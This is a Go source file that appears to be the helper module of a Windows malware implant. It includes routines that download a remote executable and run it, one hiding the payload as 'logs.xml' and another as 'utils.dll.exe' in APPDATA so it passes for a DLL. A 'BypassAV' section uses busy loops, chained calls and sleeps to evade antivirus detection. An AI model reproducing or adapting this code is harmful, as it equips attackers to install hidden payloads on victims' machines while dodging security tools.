package main

import "os"
import "strings"
import "os/exec"
import "os/user"
import "encoding/base64"
import "github.com/cavaliercoder/grab"
import "time"
//import "github.com/cleversoap/go-cp"

//Start command in minimized window and returns output

func Run(cmd string) string {
	e := exec.Command(cmd)
	res, _ := e.Output()
	e.Run()
	return string(res)
}

func Wait() {
	time.Sleep(5 * time.Second)
}

func GetUsername() string {
	usr, _ := user.Current()
	return usr.Username
}

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64EncodeRaw(str []byte) string {
	return base64.StdEncoding.EncodeToString(str)
}


func Base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func GetExeName() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-1]
}

func GetParentFolder() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-2]
}

func Upgrade(link string) {
	//saves link download to logs.xml. Should be a DIRECT download!!!
	grab.Get("logs.xml", link) //donwloads new exe and saves as xml to hide 
	Run("logs.xml") //runs file as binary
}

func DownloadAndRun(url string) {
	fileName := "utils.dll.exe"  // .dll for impersonating dll if user hides common extensions
	grab.Get(os.Getenv("APPDATA") + "\\" + fileName, url)
	Run("start " + os.Getenv("APPDATA")+"\\"+fileName)
}

func manageFatality() {
	
}



//-------------------------------------
//--------------ByPassAv---------------
//-------------------------------------

var MagicNumber int64 = 0;  

func BypassAV() {
  LongLoop()
  Jump()
  Wait()
}
func Jump() {MagicNumber++;hop1();}
func LongLoop()  {for i := 0; i < 1000000; i++ {}}
func hop1() {MagicNumber++;hop2();}
func hop2() {MagicNumber++;hop3();}
func hop3() {MagicNumber++;hop4();}
func hop4() {MagicNumber++;hop5();}
func hop5() {MagicNumber++;hop6();}
func hop6() {MagicNumber++;hop7();}
func hop7() {MagicNumber++;hop8();}
func hop8() {MagicNumber++;hop9();}
func hop9() {MagicNumber++;hop10();}
func hop10() {MagicNumber++;}




